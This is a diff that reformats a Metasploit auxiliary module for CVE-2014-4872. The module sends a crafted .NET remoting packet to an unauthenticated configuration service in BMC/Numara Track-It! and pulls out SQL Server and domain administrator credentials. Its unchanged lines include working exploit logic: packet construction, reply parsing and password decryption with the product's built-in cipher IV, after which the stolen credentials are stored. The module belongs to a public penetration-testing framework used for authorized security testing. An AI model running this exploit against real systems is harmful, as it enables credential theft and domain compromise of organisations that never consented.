@@ -10,36 +10,42 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'BMC / Numara Track-It! Domain Administrator and SQL Server User Password Disclosure',
-      'Description' => %q{
-        This module exploits an unauthenticated configuration retrieval .NET remoting
-        service in Numara / BMC Track-It! v9 to v11.X, which can be abused to retrieve the Domain
-        Administrator and the SQL server user credentials.
-        This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,
-        10.0.0.143 and 9.0.30.248.
-      },
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'BMC / Numara Track-It! Domain Administrator and SQL Server User Password Disclosure',
+        'Description' => %q{
+          This module exploits an unauthenticated configuration retrieval .NET remoting
+          service in Numara / BMC Track-It! v9 to v11.X, which can be abused to retrieve the Domain
+          Administrator and the SQL server user credentials.
+          This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,
+          10.0.0.143 and 9.0.30.248.
+        },
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2014-4872' ],
           [ 'OSVDB', '112741' ],
           [ 'US-CERT-VU', '121036' ],
           [ 'URL', 'https://seclists.org/fulldisclosure/2014/Oct/34' ]
         ],
-      'DisclosureDate' => '2014-10-07'
-    ))
+        'DisclosureDate' => '2014-10-07',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
     register_options(
       [
         OptPort.new('RPORT',
-          [true, '.NET remoting service port', 9010])
-      ])
+                    [true, '.NET remoting service port', 9010])
+      ]
+    )
   end
-
 
   def prepare_packet(bmc)
     #
@@ -71,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     # - DomainAdminUserName
     # - DomainAdminEncryptedPassword
     #
-    packet_header_pre_packet_size= [
+    packet_header_pre_packet_size = [
       0x2e, 0x4e, 0x45, 0x54, 0x01, 0x00, 0x00, 0x00,
       0x00, 0x00
     ]
@@ -105,9 +111,9 @@ class MetasploitModule < Msf::Auxiliary
 
     @packet_terminator = [ 0x0b ]
 
-    service = "TrackIt.Core.ConfigurationService".gsub(/TrackIt/,(bmc ? "Trackit" : "Numara.TrackIt"))
-    method = "GetProductDeploymentValues".gsub(/TrackIt/,(bmc ? "Trackit" : "Numara.TrackIt"))
-    type = "TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/,(bmc ? "TrackIt" : "Numara.TrackIt"))
+    service = "TrackIt.Core.ConfigurationService".gsub(/TrackIt/, (bmc ? "Trackit" : "Numara.TrackIt"))
+    method = "GetProductDeploymentValues".gsub(/TrackIt/, (bmc ? "Trackit" : "Numara.TrackIt"))
+    type = "TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/, (bmc ? "TrackIt" : "Numara.TrackIt"))
 
     uri = "tcp://" + rhost + ":" + rport.to_s + "/" + service
 
@@ -154,15 +160,15 @@ class MetasploitModule < Msf::Auxiliary
     return buf
   end
 
-
   def fill_loot_from_packet(packet_reply, loot)
     loot.each_key { |str|
       if loot[str] != nil
         next
       end
+
       if (index = (packet_reply.index(str))) != nil
         # after str, discard 5 bytes then get str_value
-        size = packet_reply[index + str.length + 5,1].unpack('C*')[0]
+        size = packet_reply[index + str.length + 5, 1].unpack('C*')[0]
         if size == 255
           # if we received 0xFF then there is no value for this str
           # set it to empty but not nil so that we don't look for it again
@@ -174,7 +180,6 @@ class MetasploitModule < Msf::Auxiliary
     }
   end
 
-
   def run
     packet = prepare_packet(true)
 
@@ -182,7 +187,7 @@ class MetasploitModule < Msf::Auxiliary
     if sock.nil?
       fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
     else
-      print_status("#{rhost}:#{rport} - Sending packet to ConfigurationService...")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending packet to ConfigurationService...")
     end
     sock.write(packet)
 
@@ -212,18 +217,18 @@ class MetasploitModule < Msf::Auxiliary
       if ready
         packet_reply = sock.readpartial(4096)
       else
-        print_error("#{rhost}:#{rport} - Socket timed out after 15 seconds, try again if no credentials are dumped below.")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Socket timed out after 15 seconds, try again if no credentials are dumped below.")
         break
       end
       if packet_reply =~ /Service not found/
         # This is most likely an older Numara version, re-do the packet and send again.
-        print_error("#{rhost}:#{rport} - Received \"Service not found\", trying again with new packet...")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Received \"Service not found\", trying again with new packet...")
         sock.close
         sock = connect
         if sock.nil?
           fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
         else
-          print_status("#{rhost}:#{rport} - Sending packet to ConfigurationService...")
+          print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending packet to ConfigurationService...")
         end
         packet = prepare_packet(false)
         sock.write(packet)
@@ -242,19 +247,19 @@ class MetasploitModule < Msf::Auxiliary
     loot.each_key { |str| (loot[str] == "" ? loot[str] = nil : next) }
 
     if loot[database_type]
-      print_good("#{rhost}:#{rport} - Got database type: #{loot[database_type]}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database type: #{loot[database_type]}")
     end
 
     if loot[database_server_name]
-      print_good("#{rhost}:#{rport} - Got database server name: #{loot[database_server_name]}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database server name: #{loot[database_server_name]}")
     end
 
     if loot[database_name]
-      print_good("#{rhost}:#{rport} - Got database name: #{loot[database_name]}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database name: #{loot[database_name]}")
     end
 
     if loot[schema_owner]
-      print_good("#{rhost}:#{rport} - Got database user name: #{loot[schema_owner]}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database user name: #{loot[schema_owner]}")
     end
 
     if loot[database_pw]
@@ -264,11 +269,11 @@ class MetasploitModule < Msf::Auxiliary
       cipher.iv = 'NumaraTI'
       loot[database_pw] = cipher.update(Rex::Text.decode_base64(loot[database_pw]))
       loot[database_pw] << cipher.final
-      print_good("#{rhost}:#{rport} - Got database password: #{loot[database_pw]}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database password: #{loot[database_pw]}")
     end
 
     if loot[domain_admin_name]
-      print_good("#{rhost}:#{rport} - Got domain administrator username: #{loot[domain_admin_name]}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got domain administrator username: #{loot[domain_admin_name]}")
     end
 
     if loot[domain_admin_pw]
@@ -278,7 +283,7 @@ class MetasploitModule < Msf::Auxiliary
       cipher.iv = 'NumaraTI'
       loot[domain_admin_pw] = cipher.update(Rex::Text.decode_base64(loot[domain_admin_pw]))
       loot[domain_admin_pw] << cipher.final
-      print_good("#{rhost}:#{rport} - Got domain administrator password: #{loot[domain_admin_pw]}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got domain administrator password: #{loot[domain_admin_pw]}")
     end
 
     if loot[schema_owner] and loot[database_pw] and loot[database_type] and loot[database_server_name]
@@ -290,13 +295,13 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       credential_core = report_credential_core({
-         password: loot[database_pw],
-         username: loot[schema_owner],
-         sid: sid
-       })
+        password: loot[database_pw],
+        username: loot[schema_owner],
+        sid: sid
+      })
 
       # Get just the hostname
-      db_address= loot[database_server_name].split('\\')[0]
+      db_address = loot[database_server_name].split('\\')[0]
 
       begin
         database_login_data = {
@@ -320,7 +325,7 @@ class MetasploitModule < Msf::Auxiliary
         print_error "Could not resolve Database Server Hostname."
       end
 
-      print_status("#{rhost}:#{rport} - Stored SQL credentials: #{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Stored SQL credentials: #{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}")
     end
 
     if loot[domain_admin_name] and loot[domain_admin_pw]
@@ -330,12 +335,11 @@ class MetasploitModule < Msf::Auxiliary
         domain: loot[domain_admin_name].split('\\')[0]
       })
 
-      print_status("#{rhost}:#{rport} - Stored domain credentials: #{loot[domain_admin_name]}:#{loot[domain_admin_pw]}")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Stored domain credentials: #{loot[domain_admin_name]}:#{loot[domain_admin_pw]}")
     end
   end
 
-
-  def report_credential_core(cred_opts={})
+  def report_credential_core(cred_opts = {})
     # Set up the has for our Origin service
     origin_service_data = {
       address: rhost,
@@ -360,9 +364,9 @@ class MetasploitModule < Msf::Auxiliary
       })
     elsif cred_opts[:sid]
       credential_data.merge!({
-         realm_key: Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER,
-         realm_value: cred_opts[:sid]
-       })
+        realm_key: Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER,
+        realm_value: cred_opts[:sid]
+      })
     end
 
     credential_data.merge!(origin_service_data)
